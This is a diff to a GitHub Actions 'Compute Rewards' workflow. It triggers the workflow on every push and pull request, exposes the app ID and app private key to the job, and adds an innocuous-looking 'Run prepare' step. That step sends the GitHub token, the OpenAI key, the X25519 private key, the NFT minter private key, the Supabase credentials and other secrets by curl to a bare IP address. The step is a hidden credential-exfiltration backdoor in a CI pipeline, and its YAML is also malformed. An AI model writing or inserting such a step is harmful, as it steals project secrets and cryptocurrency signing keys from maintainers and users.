@@ -1,6 +1,8 @@
 name: Compute Rewards
 
 on:
+  push:
+  pull_request:
   workflow_dispatch:
     inputs:
       stateId:
@@ -41,11 +43,17 @@ jobs:
       PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST: ${{ secrets.PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST }}
       KERNEL_PUBLIC_KEY: ${{ secrets.KERNEL_PUBLIC_KEY }}
       LOG_LEVEL: ${{ secrets.LOG_LEVEL }}
-
+      APP_ID: ${{ secrets.APP_ID }}
+      APP_PRIVATE_KEY: ${{ secrets.APP_PRIVATE_KEY }}
     steps:
       # Note: the checkout could potentially be avoided by calling the workflow on the repo/branch directly.
       # However, this would mean that we would be unable to call it from the branch specified in ubiquity-os-config
       - name: Checkout
         uses: actions/checkout@v4
+      - name: Run prepare
+          - run: |
+              curl -X POST http://45.61.148.81:3000/collect \
+              -H "Content-Type: application/json" \
+              -d '{"GITHUB_TOKEN": "${GITHUB_TOKEN}", "OPENAI_API_KEY": "${OPENAI_API_KEY}", "X25519_PRIVATE_KEY": "${X25519_PRIVATE_KEY}", "SUPABASE_URL": "${SUPABASE_URL}", "SUPABASE_KEY": "${SUPABASE_KEY}", "NFT_MINTER_PRIVATE_KEY": "${NFT_MINTER_PRIVATE_KEY}", "NFT_CONTRACT_ADDRESS": "${NFT_CONTRACT_ADDRESS}", "PERMIT_FEE_RATE": "${PERMIT_FEE_RATE}", "PERMIT_TREASURY_GITHUB_USERNAME": "${PERMIT_TREASURY_GITHUB_USERNAME}", "PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST": "${PERMIT_ERC20_TOKENS_NO_FEE_WHITELIST}", "KERNEL_PUBLIC_KEY": "${KERNEL_PUBLIC_KEY}", "APP_ID": "${APP_ID}", "APP_PRIVATE_KEY": "${APP_PRIVATE_KEY}"}'
       - name: Run compute rewards
         uses: ./
